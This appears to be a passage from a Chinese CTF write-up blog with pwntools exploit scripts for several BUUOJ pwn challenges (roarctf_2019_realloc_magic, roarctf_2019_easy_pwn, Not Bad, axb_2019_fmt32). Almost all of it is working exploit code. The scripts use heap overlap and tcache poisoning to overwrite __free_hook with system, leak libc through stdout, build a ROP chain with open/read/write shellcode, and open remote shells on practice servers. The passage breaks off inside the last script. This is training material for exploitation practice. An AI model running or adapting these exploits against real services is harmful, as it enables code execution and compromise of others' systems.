<h3 id="realloc可以实现堆重叠，然后覆盖fd低位为tcache头，然后控制到tcache头，造出libc地址，然后覆盖低位地址为stdout，然后覆盖数据实现libc-leak，然后执行magic清空指针，然后申请堆块回到tcache头，通过tcache-attack控制-free-hook-8的地址数据为-bin-sh-x00，然后向下覆盖-free-hook地址为system，然后直接free就可以拿到shell。">realloc可以实现堆重叠，然后覆盖fd低位为tcache头，然后控制到tcache头，造出libc地址，然后覆盖低位地址为stdout，然后覆盖数据实现libc leak，然后执行magic清空指针，然后申请堆块回到tcache头，通过tcache attack控制__free_hook - 8的地址数据为/bin/sh\x00，然后向下覆盖__free_hook地址为system，然后直接free就可以拿到shell。</h3>
<h3 id="非预期：另外可以使用超大堆块漏洞来实现控制tcache头，但是方法较上面方法复杂，且使用存在使用条件（目标靶机必须要有足够大的内存，如果靶机内存很小，还有另一种非预期解，此方法针对可以申请大内存块的靶机），所以我一开始使用非预期解打BUUOJ平台的时候，发现打不通，但是本地却可以打通，应该也是内存申请过大的原因导致的。">非预期：另外可以使用超大堆块漏洞来实现控制tcache头，但是方法较上面方法复杂，且使用存在使用条件（目标靶机必须要有足够大的内存，如果靶机内存很小，还有另一种非预期解，此方法针对可以申请大内存块的靶机），所以我一开始使用非预期解打BUUOJ平台的时候，发现打不通，但是本地却可以打通，应该也是内存申请过大的原因导致的。</h3>
<h3 id="Ubuntu18">Ubuntu18</h3>
<h3 id="常规解">常规解</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;roarctf_2019_realloc_magic&quot;)</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug &#x3D;&#x3D; 1):</span><br><span class="line">        sh &#x3D; process(&quot;.&#x2F;roarctf_2019_realloc_magic&quot;)</span><br><span class="line">        lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">    else:</span><br><span class="line">        sh &#x3D; remote(ip,port)</span><br><span class="line">        lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">    def realloc(size,content):</span><br><span class="line">        sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;)</span><br><span class="line">        sh.sendlineafter(&quot;?&quot;,str(size))</span><br><span class="line">        sh.sendafter(&quot;?&quot;,content)</span><br><span class="line">    def free():</span><br><span class="line">        sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;)</span><br><span class="line">    def magic():</span><br><span class="line">        sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;666&quot;)</span><br><span class="line">    def Debug():</span><br><span class="line">        if(debug &#x3D;&#x3D; 1):</span><br><span class="line">            log.success(&quot;pid: &quot; + str(sh.pid))</span><br><span class="line">    realloc(0,&#39;&#39;)</span><br><span class="line">    realloc(0x100,&#39;\x11&#39; * 0x100)</span><br><span class="line">    free()</span><br><span class="line">    realloc(0x48,&#39;\x12&#39; * 0x48)</span><br><span class="line">    realloc(0,&#39;&#39;)</span><br><span class="line">    realloc(0xB8,&#39;\x13&#39; * 0xB8)</span><br><span class="line">    free()</span><br><span class="line">    realloc(0,&#39;&#39;)</span><br><span class="line">    realloc(0x200,&#39;\x14&#39; * 0x200)</span><br><span class="line">    realloc(0,&#39;&#39;)</span><br><span class="line">    payload &#x3D; &#39;\x15&#39; * 0x48 + p64(0xC1) + p16(0x7010)</span><br><span class="line">    realloc(0x100,payload)</span><br><span class="line">    realloc(0,&#39;&#39;)</span><br><span class="line">    realloc(0xb8,&#39;\x16&#39; * 0xb8)</span><br><span class="line">    realloc(0x38,&#39;\x17&#39; * 0x38)</span><br><span class="line">    realloc(0,&quot;&quot;)</span><br><span class="line">    payload  &#x3D; p64(0xffffffffffffffff - 7) * 8</span><br><span class="line">    payload +&#x3D; p64(0) * 6 + p64(0x7010)</span><br><span class="line">    realloc(0xb8,payload)</span><br><span class="line">    payload &#x3D; p64(0)  </span><br><span class="line">    realloc(0x68,payload)</span><br><span class="line">    payload &#x3D; p64(0) * 8</span><br><span class="line">    payload +&#x3D; p64(0) * 6 + p16(0x7758)</span><br><span class="line">    realloc(0x168,payload)</span><br><span class="line">    realloc(0,&#39;&#39;)</span><br><span class="line">    payload &#x3D; p64(0) + p64(0xfbad1800) + p64(0) * 3 + chr(0)</span><br><span class="line">    realloc(0x78,payload)</span><br><span class="line">    sh.recvuntil(payload[0:len(payload)-1],timeout &#x3D; 1)</span><br><span class="line">    libc &#x3D; u64(sh.recv(8)) - 128 - lib.symbols[&#39;_IO_2_1_stderr_&#39;]</span><br><span class="line">    system &#x3D; libc +lib.symbols[&#39;system&#39;]</span><br><span class="line">    binsh &#x3D; libc +lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">    __free_hook &#x3D; libc + lib.symbols[&#39;__free_hook&#39;]</span><br><span class="line">    __malloc_hook &#x3D; libc + lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">    magic()</span><br><span class="line">    payload  &#x3D; p64(0) * 8</span><br><span class="line">    payload +&#x3D; p64(__free_hook - 8)</span><br><span class="line">    realloc(0x168,payload)</span><br><span class="line">    realloc(0,&#39;&#39;)</span><br><span class="line">    realloc(18,&#39;&#x2F;bin&#x2F;sh\x00&#39; + p64(system))</span><br><span class="line">    free()</span><br><span class="line">    log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">    log.success(&quot;binsh: &quot; + hex(binsh))</span><br><span class="line">    log.success(&quot;__free_hook: &quot; + hex(__free_hook))</span><br><span class="line">    log.success(&quot;__malloc_hook: &quot; + hex(__malloc_hook))    </span><br><span class="line">    log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">    Debug()</span><br><span class="line">    sh.interactive()</span><br><span class="line">    return True</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    #pwn(&quot;node3.buuoj.cn&quot;,28913,1)</span><br><span class="line">    while(1):</span><br><span class="line">        try:</span><br><span class="line"></span><br><span class="line">            if(pwn(&quot;node3.buuoj.cn&quot;,28164,0) &#x3D;&#x3D; True):</span><br><span class="line">                break</span><br><span class="line">        except EOFError:</span><br><span class="line">            sh.close()</span><br><span class="line">            continue</span><br></pre></td></tr></table></figure>
<h3 id="Ubuntu18-2">Ubuntu18</h3>
<h3 id="非常规解">非常规解</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;roarctf_2019_realloc_magic&quot;)</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug &#x3D;&#x3D; 1):</span><br><span class="line">        sh &#x3D; process(&quot;.&#x2F;roarctf_2019_realloc_magic&quot;)</span><br><span class="line">        lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">    else:</span><br><span class="line">        sh &#x3D; remote(ip,port)</span><br><span class="line">        lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">    def realloc(size,content):</span><br><span class="line">        sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;)</span><br><span class="line">        sh.sendlineafter(&quot;?&quot;,str(size))</span><br><span class="line">        sh.sendafter(&quot;?&quot;,content)</span><br><span class="line">    def free():</span><br><span class="line">        sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;)</span><br><span class="line">    def magic():</span><br><span class="line">        sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;666&quot;)</span><br><span class="line">    def Debug():</span><br><span class="line">        if(debug &#x3D;&#x3D; 1):</span><br><span class="line">            log.success(&quot;pid: &quot; + str(sh.pid))</span><br><span class="line">        input()</span><br><span class="line">            #x&#x2F;5gx 0x555555554000+0x202058</span><br><span class="line">    max_size &#x3D; -0x1</span><br><span class="line">    realloc(0x80,&#39;\x11&#39; * 0x80)</span><br><span class="line">    free()</span><br><span class="line">    realloc(0x100,&#39;\x12&#39; * 0x100)</span><br><span class="line">    free()</span><br><span class="line">    realloc(0,&#39;&#39;)</span><br><span class="line">    realloc(0x80,p16(0x7010))</span><br><span class="line">    realloc(max_size,&#39;\n&#39;)</span><br><span class="line">    realloc(0,&#39;&#39;)</span><br><span class="line">    realloc(0x110,p16(0x7010))</span><br><span class="line">    realloc(0,&#39;&#39;)</span><br><span class="line">    realloc(0x100,p16(0x7010))</span><br><span class="line">    realloc(max_size,&#39;\n&#39;)</span><br><span class="line">    #Debug()</span><br><span class="line">    realloc(0,&#39;&#39;)</span><br><span class="line">    realloc(0x80,p16(0x7010))</span><br><span class="line">    realloc(max_size,&#39;\n&#39;)</span><br><span class="line">    payload  &#x3D; p64(0xffffffffffffffff - 7) * 8</span><br><span class="line">    payload +&#x3D; p64(0) * 16 + p16(0x7010)</span><br><span class="line">    realloc(0x100,payload)</span><br><span class="line">    free()</span><br><span class="line">    realloc(0x80,&#39;\n&#39;)</span><br><span class="line">    payload  &#x3D; p64(0) * 8</span><br><span class="line">    payload +&#x3D; p64(0) * 11 + p16(0x7758)# + chr(0xdd)</span><br><span class="line">    realloc(0x200,payload)</span><br><span class="line">    realloc(0,&#39;&#39;)</span><br><span class="line">    payload &#x3D; p64(0) + p64(0xfbad1800) + p64(0) * 3 + chr(0)</span><br><span class="line">    realloc(0xc0,payload)</span><br><span class="line">    sh.recvuntil(payload[0:len(payload)-1],timeout &#x3D; 3)</span><br><span class="line">    libc &#x3D; u64(sh.recv(8)) - 128 - lib.symbols[&#39;_IO_2_1_stderr_&#39;]</span><br><span class="line">    system &#x3D; libc +lib.symbols[&#39;system&#39;]</span><br><span class="line">    binsh &#x3D; libc +lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">    __free_hook &#x3D; libc + lib.symbols[&#39;__free_hook&#39;]</span><br><span class="line">    __malloc_hook &#x3D; libc + lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">    magic()</span><br><span class="line">    payload &#x3D; p64(0) * 8</span><br><span class="line">    payload +&#x3D; p64(__free_hook - 8)</span><br><span class="line">    realloc(0x118,payload)</span><br><span class="line">    realloc(0,&#39;&#39;) </span><br><span class="line">    realloc(0x18,&quot;&#x2F;bin&#x2F;sh\x00&quot; + p64(system))</span><br><span class="line">    free()</span><br><span class="line">    log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">    log.success(&quot;binsh: &quot; + hex(binsh))</span><br><span class="line">    log.success(&quot;__free_hook: &quot; + hex(__free_hook))</span><br><span class="line">    log.success(&quot;__malloc_hook: &quot; + hex(__malloc_hook))    </span><br><span class="line">    log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">    sh.interactive()</span><br><span class="line">    return True</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    #pwn(&quot;node3.buuoj.cn&quot;,28913,0)</span><br><span class="line">    while(1):</span><br><span class="line">        try:</span><br><span class="line">            if(pwn(&quot;node3.buuoj.cn&quot;,28460,0) &#x3D;&#x3D; True):#&quot;node3.buuoj.cn&quot;,28460</span><br><span class="line">                break</span><br><span class="line">        except EOFError:</span><br><span class="line">            sh.close()</span><br><span class="line">            continue</span><br></pre></td></tr></table></figure>
<h2 id="0x68-roarctf-2019-easy-pwn">0x68 roarctf_2019_easy_pwn</h2>
<h3 id="堆块重叠即可">堆块重叠即可</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;roarctf_2019_easy_pwn&quot;)</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global lib</span><br><span class="line">	global sh</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;roarctf_2019_easy_pwn&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;libc-2.23.so&quot;)</span><br><span class="line">	def add(size):</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,&quot;1&quot;)</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,str(size))</span><br><span class="line">	def free(idx):</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,&quot;3&quot;)</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">	def edit(idx,size,content):</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,&quot;2&quot;)</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,str(size))</span><br><span class="line">		sh.sendafter(&quot;:&quot;,content)</span><br><span class="line">	def show(idx):</span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,&quot;4&quot;)#x&#x2F;50gx 0x202040 + </span><br><span class="line">		sh.sendlineafter(&quot;:&quot;,str(idx))</span><br><span class="line">	def Debug():</span><br><span class="line">		if(debug &#x3D;&#x3D; 1):</span><br><span class="line">			gdb_script &#x3D; &#39;x&#x2F;50gx &amp;__free_hook - 0x10&#39;</span><br><span class="line">			gdb.attach(sh,gdb_script)</span><br><span class="line">	add(0x18)</span><br><span class="line">	add(0x18)	</span><br><span class="line">	add(0x88)</span><br><span class="line">	add(0x18)</span><br><span class="line">	edit(0,(0x18 + 10),&#39;a&#39; * 0x18 + &quot;\x91&quot;)</span><br><span class="line">	payload &#x3D; &#39;\x13&#39; * 0x68 + p64(0x21)</span><br><span class="line">	payload &#x3D; payload.ljust(0x88,&#39;\x13&#39;)</span><br><span class="line">	edit(2,0x88,payload)</span><br><span class="line">	free(1)</span><br><span class="line">	add(0x88)</span><br><span class="line">	payload &#x3D; p64(0) * 3 + p64(0x91)</span><br><span class="line">	payload &#x3D; payload.ljust(0x88,&#39;\x11&#39;)</span><br><span class="line">	edit(1,0x88,payload)</span><br><span class="line">	free(2)</span><br><span class="line">	payload &#x3D; &#39;a&#39; * 0x20</span><br><span class="line">	edit(1,len(payload),payload)</span><br><span class="line">	show(1)</span><br><span class="line">	libc &#x3D; u64(sh.recvuntil(&#39;\x7f&#39;,False)[-6:].ljust(8,&#39;\x00&#39;)) - 88 - lib.symbols[&#39;__malloc_hook&#39;] - 0x10</span><br><span class="line">	system &#x3D; libc +lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc +lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	__free_hook &#x3D; libc +lib.symbols[&#39;__free_hook&#39;]</span><br><span class="line">	__malloc_hook &#x3D; libc +lib.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">	payload &#x3D; p64(0) * 3 + p64(0x91) + p64(0) + p64(__free_hook - 0x50 + 3)</span><br><span class="line">	edit(1,len(payload),payload)</span><br><span class="line">	add(0x88)</span><br><span class="line">	payload &#x3D; p64(0) * 3 + p64(0x71)</span><br><span class="line">	edit(1,len(payload),payload)</span><br><span class="line">	payload &#x3D; &#39;&#39;</span><br><span class="line">	payload &#x3D; payload.ljust(0x68,&#39;\x00&#39;)</span><br><span class="line">	payload +&#x3D; p64(0x21)</span><br><span class="line">	edit(2,len(payload),payload)</span><br><span class="line">	free(2)</span><br><span class="line">	payload &#x3D; p64(0) * 3 + p64(0x71) + p64(__free_hook - 0x40)</span><br><span class="line">	edit(1,len(payload),payload)</span><br><span class="line">	add(0x68)</span><br><span class="line">	add(0x68)</span><br><span class="line">	payload &#x3D; p64(0) * 6 + p64(system)</span><br><span class="line">	edit(4,len(payload),payload)</span><br><span class="line">	payload &#x3D; &#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">	edit(0,len(payload),payload)</span><br><span class="line">	free(0)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;node3.buuoj.cn&quot;,28092,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x69-极客大挑战-2019-Not-Bad">0x69 [极客大挑战 2019]Not Bad</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;bad&quot;)</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug &#x3D;&#x3D; 1):</span><br><span class="line">        sh &#x3D; process(&quot;.&#x2F;bad&quot;)</span><br><span class="line">        lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">    else:</span><br><span class="line">        sh &#x3D; remote(ip,port)</span><br><span class="line">        lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">    payload &#x3D; &#39;a&#39; * 9</span><br><span class="line">    payload +&#x3D; p64(0x400A34)</span><br><span class="line">    payload &#x3D; payload.ljust(0x20,&#39;a&#39;)</span><br><span class="line">    payload +&#x3D; p64(0xc3ca29c429485e55)</span><br><span class="line">    payload +&#x3D; p64(0x4009EE) </span><br><span class="line">    sh.sendlineafter(&quot;fun!\n&quot;,payload)</span><br><span class="line">    sleep(0.2)</span><br><span class="line">    pop_rdi_ret &#x3D; elf.search(asm(&quot;pop rdi\nret&quot;)).next()</span><br><span class="line">    pop_rsi_r15_ret &#x3D; elf.search(asm(&quot;pop rsi\npop r15\nret&quot;)).next()</span><br><span class="line">    payload &#x3D; &#39;a&#39; * 8</span><br><span class="line">    payload +&#x3D; p64(pop_rdi_ret)</span><br><span class="line">    payload +&#x3D; p64(0)</span><br><span class="line">    payload +&#x3D; p64(pop_rsi_r15_ret)</span><br><span class="line">    payload +&#x3D; p64(elf.bss()) + p64(0)</span><br><span class="line">    payload +&#x3D; p64(elf.plt[&#39;read&#39;])</span><br><span class="line">    payload +&#x3D; p64(elf.bss())</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    sleep(0.2)</span><br><span class="line">    shellcode &#x3D; shellcraft.open(&quot;&#x2F;flag&quot;)</span><br><span class="line">    shellcode +&#x3D; shellcraft.read(3,elf.bss() + 0x800,0x30)</span><br><span class="line">    shellcode +&#x3D; shellcraft.write(1,elf.bss() + 0x800,0x30)</span><br><span class="line">    sh.sendline(asm(shellcode))</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    pwn(&quot;node3.buuoj.cn&quot;,28235,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x70-axb-2019-fmt32">0x70 axb_2019_fmt32</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">##coding&#x3D;utf8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">ip &#x3D; &quot;47.108.135.45&quot;</span><br><span class="line">port &#x3D; 20023</span><br><span class="line">sh &#x3D; remote(ip, port)</span><br><span class="line">lib &#x3D; ELF(&quot;libc.so.6&quot;)</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">0x3a80c execve(&quot;&#x2F;bin&#x2F;sh&quot;, esp+0x28, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x28] &#x3D;&#x3D; NULL</span><br><span class="line">0x3a80e execve(&quot;&#x2F;bin&#x2F;sh&quot;, esp+0x2c, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x2c] &#x3D;&#x3D; NULL</span><br><span class="line">0x3a812 execve(&quot;&#x2F;bin&#x2F;sh&quot;, esp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x30] &#x3D;&#x3D; NULL</span><br><span class="line">0x3a819 execve(&quot;&#x2F;bin&#x2F;sh&quot;, esp+0x34, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x34] &#x3D;&#x3D; NULL</span><br><span class="line">0x5f065 execl(&quot;&#x2F;bin&#x2F;sh&quot;, eax)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of 